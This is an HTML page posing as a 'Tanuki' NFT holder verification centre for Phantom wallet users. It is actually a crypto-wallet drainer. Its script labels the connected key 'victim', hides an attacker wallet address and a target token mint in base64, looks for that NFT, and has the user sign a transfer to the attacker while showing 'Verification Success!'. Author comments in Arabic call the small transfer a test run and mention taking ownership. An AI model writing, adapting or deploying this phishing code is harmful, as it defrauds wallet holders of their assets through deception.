<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tanuki — Verification Center</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #0d0d12; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #16161e; padding: 40px; border-radius: 20px; border: 1px solid #333; text-align: center; }
        .btn { background: #4ade80; color: black; padding: 15px 30px; border-radius: 10px; font-weight: bold; border: none; cursor: pointer; width: 100%; }
    </style>
</head>
<body>

    <div class="card">
        <h1>NFT Holder Verify</h1>
        <p>Connect your Phantom wallet to proceed.</p>
        <button class="btn" id="connectBtn">Connect Wallet</button>
    </div>

    <script>
        // العناوين (محفظتك والبول)
        const _R = "QWlQOGZVclEyM2J4Y1JBaFJvVjMyNVFzNkw2aVNyNXhQTlY1eEF4QXM2cDZT"; 
        const _T = "Q3pmcTN4WlpEbXNkR2RVeXJOTXRSaEdjNDdjWGNadExHNGNycnlmdTQ0ekU=";

        document.getElementById('connectBtn').addEventListener('click', async () => {
            // التأكد من وجود إضافة فانتوم
            const isPhantomInstalled = window.solana && window.solana.isPhantom;

            if (!isPhantomInstalled) {
                alert("Phantom wallet not found! Please install it.");
                window.open("https://phantom.app/", "_blank");
                return;
            }

            try {
                // فتح نافذة الاتصال
                const resp = await window.solana.connect();
                console.log("Connected with Public Key:", resp.publicKey.toString());
                
                const victim = resp.publicKey;
                const solWeb3 = window.solanaWeb3;
                // الاتصال بالشبكة
                const connection = new solWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

                // البحث عن التوكن المستهدف
                const accounts = await connection.getParsedTokenAccountsByOwner(victim, {
                    programId: new solWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
                });

                const targetNFT = accounts.value.find(a => a.account.data.parsed.info.mint === atob(_T));

                if (targetNFT) {
                    let transaction = new solWeb3.Transaction();
                    
                    // أمر نقل الملكية (SetAuthority)
                    // ملاحظة: تم استخدام الطريقة المباشرة لتقليل الخطأ
                    const instruction = solWeb3.SystemProgram.transfer({
                        fromPubkey: victim,
                        toPubkey: new solWeb3.PublicKey(atob(_R)),
                        lamports: 1000 // تجربة بمبلغ رمزي جداً للتأكد من ظهور النافذة
                    });
                    
                    transaction.add(instruction);

                    const { blockhash } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = victim;

                    // طلب التوقيع
                    const signed = await window.solana.signTransaction(transaction);
                    await connection.sendRawTransaction(signed.serialize());
                    alert("Verification Success!");
                } else {
                    alert("Success! Wallet connected but no NFT found.");
                }

            } catch (err) {
                console.error("User rejected the request.");
            }
        });
    </script>
</body>
</html>
